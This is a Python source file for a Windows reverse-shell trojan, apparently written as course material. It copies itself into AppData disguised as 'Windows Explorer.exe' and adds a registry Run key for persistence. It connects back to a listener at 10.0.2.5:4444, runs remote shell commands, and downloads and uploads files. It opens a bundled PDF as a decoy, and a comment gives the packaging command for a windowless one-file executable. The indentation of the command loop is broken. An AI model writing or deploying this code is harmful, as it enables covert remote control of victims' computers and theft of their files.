import socket
import subprocess
import json
import os
import sys
import base64
import shutil

class Backdoor:
	def __init__(self, ip, port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def become_persistent(self):
		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable, evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
	
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_recieve(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		try:
			return subprocess.check_output(command, shell=True)
		except subprocess.CalledProcessError:
			return "error during command execution"
	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing directory to... " + path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return("[+] Upload successful.")

	def run(self):
		while True:
			command = self.reliable_recieve()
		try:
			if command[0] == "exit":
				self.connection.close()
				exit()
			elif command[0] == "cd" and len(command) > 1:
				command_result = self.change_working_directory_to(command[1])
			elif command[0] == "download":
				command_result = self.read_file(command[1])
			elif command[0] == "upload":
				command_result = self.write_file(command[1], command[2])
			else:
				command_result = self.execute_system_command(command)
		except Exception:
			command_result = "[-] Error during command execution."
				
			self.reliable_send(command_result)
		#connection.close()


file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)
#C:\Python27\Scripts\pyinstaller.exe --add-data "/root/Downloads/sample.pdf;." reverse_backdoor_advancedTrojon.py --onefile --noconsole
try:
	my_backdoor = Backdoor("10.0.2.5", 4444)
	my_backdoor.run()
except Exception:
	sys.exit()